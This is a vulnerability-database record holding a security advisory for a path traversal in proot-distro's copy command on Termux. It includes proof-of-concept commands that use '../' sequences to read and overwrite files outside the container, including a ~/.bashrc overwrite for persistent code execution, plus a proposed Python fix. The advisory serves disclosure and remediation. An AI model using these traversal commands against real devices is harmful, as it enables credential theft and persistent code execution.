@@ -1,0 +1,162 @@
+[basic]
+description = '''
+<html><head></head><body><h1>Path Traversal in <code>proot-distro copy</code> — Arbitrary Read, Write, and Persistent Code Execution Outside Container Rootfs</h1>
+<h2>Repository</h2>
+<p>https://github.com/termux/proot-distro</p>
+<p><strong>Maintainer:</strong> @sylirre</p>
+<hr>
+<h2>Affected Component</h2>
+<ul>
+<li><strong>Package:</strong> proot-distro</li>
+<li><strong>Affected command:</strong> <code>copy</code></li>
+<li><strong>Attack surface:</strong> Host-side Termux CLI — this is not a guest distro shell issue</li>
+<li><strong>Vulnerability type:</strong> Path Traversal (CWE-22)</li>
+</ul>
+<hr>
+<h2>Affected Versions</h2>
+
+Component | Version
+-- | --
+proot-distro | 4.38.0 (initially discovered), 5.0.2 (confirmed still affected — tested on 2026-05-19)
+Test distro | Ubuntu 25.10 \"Questing Quokka\" (ubuntu alias)
+Architecture | aarch64
+Device | Samsung A23
+Package source | https://packages-cf.termux.dev/apt/termux-main stable/main aarch64
+
+
+<hr>
+<h2>Proof of Concept</h2>
+<p>All tests were performed using only self-owned files and harmless marker data.
+No root was used. No third-party data was involved. The <code>.bashrc</code> overwritten
+during testing was immediately restored.</p>
+<h3>Step 1 — Setup</h3>
+<pre><code>rm -rf ~/poc
+mkdir -p ~/poc
+</code></pre>
+<hr>
+<h3>Step 2 — Arbitrary write (overwrite a file outside the container rootfs)</h3>
+<pre><code>echo \"ORIGINAL\" &gt; ~/poc/target.txt
+echo \"PWNED_BY_PROOT_DISTRO\" &gt; ~/poc/evil.txt
+
+proot-distro copy \
+  ~/poc/evil.txt \
+  \"ubuntu:$(printf '../%.0s' {1..20})data/data/com.termux/files/home/poc/target.txt\"
+</code></pre>
+<p>Observed output:</p>
+<pre><code>[*] Source: '/data/data/com.termux/files/home/poc/evil.txt'
+[*] Destination: '/data/data/com.termux/files/home/poc/target.txt'
+[*] Copying files, this may take a while...
+[*] Finished copying files.
+</code></pre>
+<p>Verification:</p>
+<pre><code>cat ~/poc/target.txt
+→ PWNED_BY_PROOT_DISTRO
+</code></pre>
+<p>This confirms that the destination resolved to a path outside the container
+rootfs and the file was overwritten successfully.</p>
+<hr>
+<h3>Step 3 — Arbitrary read (exfiltrate a file from outside the container rootfs)</h3>
+<pre><code>echo \"TOP_SECRET\" &gt; ~/poc/secret.txt
+
+proot-distro copy \
+  \"ubuntu:$(printf '../%.0s' {1..20})data/data/com.termux/files/home/poc/secret.txt\" \
+  ~/poc/read_result.txt
+</code></pre>
+<p>Observed output:</p>
+<pre><code>[*] Source: '/data/data/com.termux/files/home/poc/secret.txt'
+[*] Destination: '/data/data/com.termux/files/home/poc/read_result.txt'
+[*] Copying files, this may take a while...
+[*] Finished copying files.
+</code></pre>
+<p>Verification:</p>
+<pre><code>cat ~/poc/read_result.txt
+→ TOP_SECRET
+</code></pre>
+<p>This confirms that the source path resolved to a file outside the container
+rootfs and its contents were successfully copied to a host-side destination.</p>
+<hr>
+<h3>Step 4 — Persistent code execution via <code>.bashrc</code> overwrite</h3>
+<pre><code>printf 'echo VULN_TRIGGERED &gt; ~/poc/proof.txt\n' &gt; ~/poc/payload.sh
+
+proot-distro copy ~/poc/payload.sh \
+  \"ubuntu:$(printf '../%.0s' {1..20})data/data/com.termux/files/home/.bashrc\"
+</code></pre>
+<p>Observed output:</p>
+<pre><code>[*] Source: '/data/data/com.termux/files/home/poc/payload.sh'
+[*] Destination: '/data/data/com.termux/files/home/.bashrc'
+[*] Copying files, this may take a while...
+[*] Finished copying files.
+</code></pre>
+<p>Verification before restart:</p>
+<pre><code>cat ~/.bashrc
+→
+echo VULN_TRIGGERED &gt; ~/poc/proof.txt
+</code></pre>
+<p>After closing and reopening Termux, the new shell sourced <code>.bashrc</code> and
+executed the payload automatically:</p>
+<pre><code>cat ~/poc/proof.txt
+→ VULN_TRIGGERED
+</code></pre>
+<p>This confirms that attacker-controlled content written into <code>.bashrc</code> executes
+automatically on the next shell launch, resulting in persistent local code
+execution within the Termux app context.</p>
+<hr>
+<h2>Attack Scenario</h2>
+<p>The most realistic exploitation path is a confused deputy scenario: a community
+script, Termux plugin, or automated tool calls <code>proot-distro copy</code> with a path
+derived from untrusted input. The attacker supplies a crafted container path.
+The tool resolves it to a host-side location and reads or writes the file
+without any boundary check. The user sees normal command output and no
+indication that a file outside the container was touched.</p>
+<p>On a real device with SSH keys or stored credentials in the Termux home
+directory, the read primitive allows silent credential theft. The write
+primitive to <code>.bashrc</code> allows persistent code execution triggered on next login.</p>
+<hr>
+<h2>Proposed Fix</h2>
+<p>After resolving the container-relative path, verify that the canonical result
+remains inside the container rootfs before allowing any read or write operation.
+Example mitigation pattern in Python:</p>
+<pre><code>import os
+
+def safe_resolve(rootfs, container_path):
+    candidate = os.path.realpath(os.path.join(rootfs, container_path.lstrip('/')))
+    root = os.path.realpath(rootfs)
+    if candidate != root and not candidate.startswith(root + os.sep):
+        raise ValueError(\"path traversal detected: resolved path escapes rootfs\")
+    return candidate
+</code></pre>
+<p>This check must be applied to both the source and destination paths in the
+<code>copy</code> subcommand.</p>
+<hr>
+<h2>Additional Notes</h2>
+<ul>
+<li>This issue was reproduced on the official Termux release from
+https://packages-cf.termux.dev, not a fork.</li>
+<li>No root access was used at any point during testing.</li>
+<li>All test files were self-owned and contained only harmless marker data.</li>
+<li>The <code>.bashrc</code> overwritten during testing was immediately restored after
+verification.</li>
+</ul></body></html>
+'''
+published = ""
+remediation = "请参考官方安全公告，及时安装安全更新或升级到最新版本。"
+score = 5
+severity = "MEDIUM"
+sources = ["ghsa"]
+title = "PRoot-Distro has Path Traversal in proot-distro copy — Arbitrary Read, Write, and Persistent Code Execution Outside Container Rootfs"
+updated = ""
+
+[exploit]
+exp_urls = []
+poc_urls = []
+
+[id]
+aliases = ["GHSA-mfr4-mq8w-vmg6"]
+ave_id = "AVE-2026-1146"
+
+[meta]
+collected_at = "2026-08-06T07:21:50.692305893+00:00"
+status = "completed"
+
+[references]
+urls = []
